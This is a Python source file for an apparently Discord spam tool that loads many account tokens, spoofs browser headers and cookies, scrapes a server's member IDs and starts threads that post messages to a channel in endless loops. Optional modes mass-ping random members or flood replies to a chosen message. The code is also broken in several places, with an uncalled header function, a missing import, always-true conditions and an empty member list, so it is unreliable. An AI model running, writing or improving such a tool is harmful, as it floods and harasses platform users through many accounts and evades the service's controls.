import os
import sys
import json
import requests
import asyncio
import time
import datetime
import discum
import threading

L = '\033[90m'  # Grey
W = '\033[0m'   # White

def cls():
    linux = "clear"
    windows = "cls"
    os.system([linux,windows][os.name=="nt"])

def get_time():
    now = datetime.datetime.now()
    current_time = now.strftime("%H:%M:%S")
    return current_time
def Consoleprint(text): print(f"{W}[{L}{get_time()}{L}] {W}{text}")

lockedd = 'Your need verify your account in order to perform this action.'
token_invalid = 'This token is invalid.'
ratelimited = 'You are ratelimited.'
errormessage = "I can't send messages on this channel text"

def getheaders():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
        'Authorization': token,
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://discord.com',
        'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers'
    }

with open("tokens.txt") as lines:
    tk = lines.read().split("\n")
    if len(tk) <= 1:
        if len(tk[0]) <= 10:
            Console.print(f"[{L}ERROR{W}] Tokens not found in tokens.txt")
            time.sleep(2.5)
            sys.exit()
tokens_count = len(tk)

def banner():
    print(f"{W}Total Tokens: {tokens_count}")
    print(f'''\n\n
   _____                       __  __
  / ___/____  ____ _____ ___  / /_/ /______  _____
  \__ \/ __ \/ __ `/ __ `__ \/ __/ //_/ __ \/ ___/
 ___/ / /_/ / /_/ / / / / / / /_/ ,< / / / (__  )
/____/ .___/\__,_/_/ /_/ /_/\__/_/|_/_/ /_/____/  {L}1.0.0{W}
    /_/

    ''')


def fucking():
    cls()
    banner()
    mass_reply = input(f"[MASS REPLY {L}(Y/N){W}] ᐳ ")

    if mass_reply == "Y" or "y":
        mass_ping = input(f"[MASS PING {L}(Y/N){W}] ᐳ ")

        if mass_ping == "Y" or "y":
            while True:
                try:
                    guild_id = int(input("[GUILD ID] ᐳ "))
                    channel_id = int(input("[CHANNEL ID] ᐳ "))
                    message_id = int(input("[MESSAGE ID] ᐳ "))
                    aumunt_ping = int(input("[AUMUNT PING] ᐳ "))
                    message = input("[MESSAGE] ᐳ ")
                    aumunt_msg = int(input(f"[AUMUNT MESSAGE {L}(1-20){W}] ᐳ "))

                    if aumunt_msg > 20:
                        print(" ")
                        Consoleprint("The maximum of messages is 20")
                        time.sleep(2)
                        fucking()

                    delay = int(input("[DELAY] ᐳ "))
                    break

                except ValueError:
                    Consoleprint("Invalid Option")
                    time.sleep(1)
                    fucking()

            def spamming_mass_reply_mass_ping():
                time.sleep(float(delay))
                messagess = [message,message]
                for messagereply in messagess:
                    member_idss = random.sample(ids, int(aumunt_ping))       
                    members_ping = " ".join([f"<@{id}>" for id in member_idss])     
                    message_spam = f'{members_ping} {messagereply}'

                data = {
                    "content": message_spam,
                    "message_reference": {
                        "channel_id": channel_id,
                        "message_id": message_id
                    }
                }

                while True:
                    try:
                        response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=getheaders, json=data)

                        if response.status_code == 200 or 203 or 204:
                            Consoleprint(f"[{L}SENT MESSAGE{W}] {token[:30]}*** {L}[Channel ID: {channel_id}]")

                        elif response.status_code == 401:
                            Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{token_invalid}]")

                        elif response.status_code == 403:
                            Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{lockedd}]")

                        elif response.status_code == 429:
                            Consoleprint(f"[{L}RATELIMITED{W}] {token[:30]}*** {L}[{ratelimited}]")

                        else:
                            Consoleprint(f"[{L}FAILED{W}] {L}[{errormessage}]")

                    except Exception as e:
                        Consoleprint(f"[{L}ERROR{W}] {L}[{e}]")

            with open("tokens.txt") as lines:
                tokens = lines.read().splitlines()
            bot = discum.Client(token=token)

            Consoleprint(f"[{L}SCRAPING{W}] {L}[Scraping IDS members in {guild_id}...]")
            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channelidlol):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(guild_id, channel_id)
            memberslist = []

            with open('ids.txt','w') as lines:
                for element in memberslist:
                    lines.write(element + '\n')

            print(" ")
            with open("ids.txt") as lines:
                ids = lines.read().splitlines()

            for token in tokens:
                for i in range(aumunt_msg):
                    threads = []
                    for token in tokens:
                        thread = threading.Thread(target=spamming_mass_reply_mass_ping)
                        thread.start()
                        threads.append(thread)

            for thread in threads:
                thread.join()

        elif mass_ping == "N" or "n":
            while True:
                try:
                    channel_id = int(input("[CHANNEL ID] ᐳ "))
                    message_id = int(input("[MESSAGE ID] ᐳ "))
                    message = input("[MESSAGE] ᐳ ")
                    aumunt_msg = int(input("[AUMUNT MESSAGES {L}(1-20){W}] ᐳ "))

                    if aumunt_msg > 20:
                        print(" ")
                        Consoleprint("The maximum of messages is 20")
                        time.sleep(2)
                        fucking()

                    delay = int(input("[DELAY] ᐳ "))
                    break

                except ValueError:
                    Consoleprint("Invalid Option")
                    time.sleep(1)
                    fucking()

            def spamming_mass_reply():
                time.sleep(float(delay))
                data = {
                    "content": message,
                    "message_reference": {
                        "channel_id": channel_id,
                        "message_id": message_id
                    }
                }

                while True:
                    try:
                        response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=getheaders, data=data)

                        if response.status_code == 200 or 203 or 204:
                            Consoleprint(f"[{L}SENT MESSAGE{W}] {token[:30]}*** {L}[Channel ID: {channel_id}]")

                        elif response.status_code == 401:
                            Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{token_invalid}]")

                        elif response.status_code == 403:
                            Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{lockedd}]")

                        elif response.status_code == 429:
                            Consoleprint(f"[{L}RATELIMITED{W}] {token[:30]}*** {L}[{ratelimited}]")

                        else:
                            Consoleprint(f"[{L}FAILED{W}] {L}[{errormessage}]")

                    except Exception as e:
                        Consoleprint(f"[{L}ERROR{W}] {L}[{e}]")

            with open("tokens.txt") as lines:
                tokens = lines.read().splitlines()

            for token in tokens:
                for i in range(aumunt_msg):
                    threads = []
                    for token in tokens:
                        thread = threading.Thread(target=spamming_mass_reply)
                        thread.start()
                        threads.append(thread)

            for thread in threads:
                thread.join()

    elif mass_reply == "N" or "n":
        while True:
            try:
                channel_id = int(input("[CHANNEL ID] ᐳ "))
                message = input("[MESSAGE] ᐳ ")
                aumunt_msg = int(input("[AUMUNT MESSAGES {L}(1-20){W}] ᐳ "))

                if aumunt_msg > 20:
                    print(" ")
                    Consoleprint("The maximum of messages is 20")
                    time.sleep(2)
                    fucking()

                delay = int(input("[DELAY] ᐳ "))
                break
            
            except ValueError:
                Consoleprint("Invalid Option")
                time.sleep(1)
                fucking()

        def spamming_normal():
            time.sleep(float(delay))
            data = {
                "content": message
            }

            while True:
                try:
                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=getheaders, data=data)

                    if response.status_code == 200 or 203 or 204:
                        Consoleprint(f"[{L}SENT MESSAGE{W}] {token[:30]}*** {L}[Channel ID: {channel_id}]")

                    elif response.status_code == 401:
                        Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{token_invalid}]")

                    elif response.status_code == 403:
                        Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{lockedd}]")

                    elif response.status_code == 429:
                        Consoleprint(f"[{L}FAILED{W}] {token[:30]}*** {L}[{lockedd}]")

                    else:
                        Consoleprint(f"[{L}FAILED{W}] {L}[{errormessage}]")

                except Exception as e:
                    Consoleprint(f"[{L}ERROR{W}] {L}[{e}]")

        with open("tokens.txt") as lines:
            tokens = lines.read().splitlines()

        for token in tokens:
            for i in range(aumunt_msg):
                threads = []
                for token in tokens:
                    thread = threading.Thread(target=spamming_normal)
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

fucking()
